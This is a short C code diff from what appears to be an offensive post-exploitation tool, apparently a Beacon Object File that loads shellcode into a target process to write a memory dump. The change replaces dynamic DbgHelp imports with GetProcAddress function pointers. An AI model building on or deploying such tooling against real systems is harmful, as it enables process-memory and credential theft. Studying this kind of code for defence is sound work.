@@ -6,18 +6,21 @@
 #include "PayloadUtils.h"
 #include "bofdefs.h"
 #include <DbgHelp.h>
+#include "fnptr.h"
 
 extern BOOL InitShellcodeParams(
     PVOID pParams,
     DWORD dwTargetProcessId,
     PCWCHAR pDumpPath
 );
-
+#define GetFNPtr(hmod, fname, varname, type) type varname = (type)GetProcAddress(hmod,fname)
 // Finds the address within buf of the image entrypoint 
 PVOID FindEntrypointVA( void * buf)
 {
     PVOID pBase = buf;
-    PIMAGE_NT_HEADERS pNtHeaders = DBGHELP$ImageNtHeader(pBase);
+    GetFNPtr(hdbghelp, "ImageNtHeader", _ImageNtHeader, fpImageNtHeader);
+    GetFNPtr(hdbghelp, "ImageRvaToVa", _ImageRvaToVa, fpImageRvaToVa);
+    PIMAGE_NT_HEADERS pNtHeaders = _ImageNtHeader(pBase);
 
     if (NULL == pNtHeaders)
     {
@@ -32,7 +35,7 @@ PVOID FindEntrypointVA( void * buf)
     }
 
     // Map RVA -> VA
-    return DBGHELP$ImageRvaToVa(pNtHeaders, pBase, pNtHeaders->OptionalHeader.AddressOfEntryPoint, NULL);
+    return _ImageRvaToVa(pNtHeaders, pBase, pNtHeaders->OptionalHeader.AddressOfEntryPoint, NULL);
 }
 
 // Pulls the shellcode out of our resource section and writes to the given pointer
